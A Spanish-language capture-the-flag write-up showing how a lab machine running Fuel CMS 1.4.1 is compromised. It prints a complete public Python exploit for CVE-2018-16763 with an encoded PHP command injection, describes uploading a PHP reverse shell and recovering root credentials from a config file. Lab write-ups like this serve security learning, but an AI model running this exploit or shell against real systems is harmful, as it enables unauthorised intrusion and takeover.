### Escaneo de Puertos 
Como primer paso se realizó un escaneo de todos los puertos de la maquina victima con la herramienta nmap

~~~ shell
nmap -sS -Pn 10.64.175.62
~~~

- -sS - Envía Paquetes TCP Syn sin completar el handshake para mejorar la velocidad del escaneo
- -Pn - Considera el host como activo

<img width="1367" height="358" alt="Image" src="https://github.com/user-attachments/assets/4ee7031b-afc7-4772-a0f7-be3ae57dafed" />

Se hallaron los siguientes puertos abiertos:
- TCP 80 - HTTP
### Enumeración

<img width="2340" height="1257" alt="Image" src="https://github.com/user-attachments/assets/d6913784-db73-42c8-858d-941fcb514203" />
<img width="1762" height="672" alt="Image" src="https://github.com/user-attachments/assets/9b5263ce-ac8b-439d-8b02-c2a132800ecf" />

Indagando por la web de la maquina víctima se encontró el servicio fuel CMS sin configurar, indicando que corre la versión 1.4, por lo que se procedió a buscar si existia algún exploit público para el servicio en esa versión

<img width="1760" height="620" alt="Image" src="https://github.com/user-attachments/assets/07d31c87-a47f-42d8-8997-8e4ddf2beb0d" />

### Explotación

En la búsqueda se encontró un script que permite ejecución de código remoto (RCE) para víctimas corriendo la versión 1.4.1 de Fuel CMS por lo que puede ser de utilidad

~~~
# Exploit Title: Fuel CMS 1.4.1 - Remote Code Execution (3)
# Exploit Author: Padsala Trushal
# Date: 2021-11-03
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763

#!/usr/bin/python3

import requests
from urllib.parse import quote
import argparse
import sys
from colorama import Fore, Style

def get_arguments():
	parser = argparse.ArgumentParser(description='fuel cms fuel CMS 1.4.1 - Remote Code Execution Exploit',usage=f'python3 {sys.argv[0]} -u <url>',epilog=f'EXAMPLE - python3 {sys.argv[0]} -u http://10.10.21.74')

	parser.add_argument('-v','--version',action='version',version='1.2',help='show the version of exploit')

	parser.add_argument('-u','--url',metavar='url',dest='url',help='Enter the url')

	args = parser.parse_args()

	if len(sys.argv) <=2:
		parser.print_usage()
		sys.exit()

	return args


args = get_arguments()
url = args.url

if "http" not in url:
	sys.stderr.write("Enter vaild url")
	sys.exit()

try:
   r = requests.get(url)
   if r.status_code == 200:
       print(Style.BRIGHT+Fore.GREEN+"[+]Connecting..."+Style.RESET_ALL)


except requests.ConnectionError:
    print(Style.BRIGHT+Fore.RED+"Can't connect to url"+Style.RESET_ALL)
    sys.exit()

while True:
	cmd = input(Style.BRIGHT+Fore.YELLOW+"Enter Command $"+Style.RESET_ALL)

	main_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+quote(cmd)+"%27%29%2b%27"

	r = requests.get(main_url)

	#<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">

	output = r.text.split('<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">')
	print(output[0])
	if cmd == "exit":

~~~

Se probó el script anterior sobre la url de la web de la víctima, obteniendo exitosamente acceso vía shell

<img width="1673" height="333" alt="Image" src="https://github.com/user-attachments/assets/8027b91d-823d-43b6-a0eb-96eb9fce2d68" />

### Post Explotación

Una vez dentro de la maquina victima el siguiente paso es buscar la forma de escalar nuestros privilegios

<img width="689" height="602" alt="Image" src="https://github.com/user-attachments/assets/1090dd5a-4fad-490d-884a-9e7cbdf104e5" />
<img width="994" height="140" alt="Image" src="https://github.com/user-attachments/assets/1acef70e-2249-462e-834c-c9d719175aae" />

Primero se obtuvo la primer flag del CTF.
Luego se busco la forma de generar una reverse shell para posteriormente poder asi obtener una shell interactiva, ya que la shell actual limita la ejecucion de ciertos comandos

<img width="466" height="402" alt="Image" src="https://github.com/user-attachments/assets/adc9e1ce-d71f-494c-80d9-17f61e02f268" />
<img width="838" height="143" alt="Image" src="https://github.com/user-attachments/assets/5e8d8e99-da9a-4bdd-90c4-d1544e6738d2" />
<img width="895" height="358" alt="Image" src="https://github.com/user-attachments/assets/ba48a5bf-0430-408c-af42-997149936da8" />

Se encontro la ruta de la maquina victima en la cual se situa el directorio raiz de la web de la victima. Esto permitira subir una reverse shell en php la cual se ejecutara al abrir esa ruta en la web

~~~
cp /usr/share/webshells/php/php-reverse-shell.php .
~~~

Se copio una reverse shell en php del paquete webshells de kali linux

<img width="1698" height="451" alt="Image" src="https://github.com/user-attachments/assets/e82f32f0-378e-43e8-a639-c13f9decba14" />

Posteriormente se subio la reverse shell a la maquina victima

<img width="1260" height="511" alt="Image" src="https://github.com/user-attachments/assets/2225803d-dd28-4cc2-98a7-d373bbf83784" />
<img width="1887" height="577" alt="Image" src="https://github.com/user-attachments/assets/9e783897-cd9a-4631-8971-7819bdd064d8" />

Se ingresó a la ruta del script, obteniendo así una shell interactiva en el sistema

<img width="916" height="402" alt="Image" src="https://github.com/user-attachments/assets/90b7b9c4-0b0c-4d53-a9ad-ea98fa8b8305" />

Se obtuvo la segunda flag del CTF.

<img width="1428" height="405" alt="Image" src="https://github.com/user-attachments/assets/61dcf6b7-3b81-46fd-b66a-2ba61f74a70b" />
<img width="1174" height="965" alt="Image" src="https://github.com/user-attachments/assets/ed07b041-4997-4845-bfd6-873abe3c9dd3" />

Se investigó la configuración del servicio Fuel CMS en donde se encontró las credenciales del usuario root en uno de los archivos de configuración

<img width="1262" height="370" alt="Image" src="https://github.com/user-attachments/assets/b7cc2ac3-99f8-41d5-8fca-07843a3f14f1" />

Se consiguio acceso exitoso al usuario root

<img width="1223" height="423" alt="Image" src="https://github.com/user-attachments/assets/ec967ec5-ed16-42e4-bff8-6df3c3b9ed3b" />

Se obtuvo la última flag, finalizado así el CTF.















